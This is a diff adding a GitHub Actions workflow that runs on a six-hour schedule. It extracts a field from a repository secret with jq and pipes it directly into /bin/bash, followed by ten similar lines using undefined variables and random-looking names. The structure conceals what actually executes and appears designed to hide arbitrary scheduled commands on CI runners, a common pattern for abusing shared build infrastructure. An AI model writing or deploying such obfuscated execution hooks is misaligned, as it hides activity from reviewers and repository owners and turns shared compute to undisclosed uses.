@@ -1,0 +1,28 @@
+name: sunxinniang4817
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sunxinniang4817
+        env:
+          r15: ${{ secrets.r15 }}
+        run: |
+          echo $r15 | jq -r .cxd36552 | /bin/bash
+          echo $zsqv12 | jq -r .zozmr63 | /bin/bash
+          echo $xkrt85083 | jq -r .er42603 | /bin/bash
+          echo $nctz05 | jq -r .wu17 | /bin/bash
+          echo $aqke156 | jq -r .ww01 | /bin/bash
+          echo $njhz44 | jq -r .xcn47 | /bin/bash
+          echo $bdzs7736 | jq -r .peth1656 | /bin/bash
+          echo $rmog764 | jq -r .dl3640 | /bin/bash
+          echo $qtp15 | jq -r .xbse32 | /bin/bash
+          echo $ud8 | jq -r .wecby02 | /bin/bash
+          echo $zqw9 | jq -r .hrsw5 | /bin/bash
+
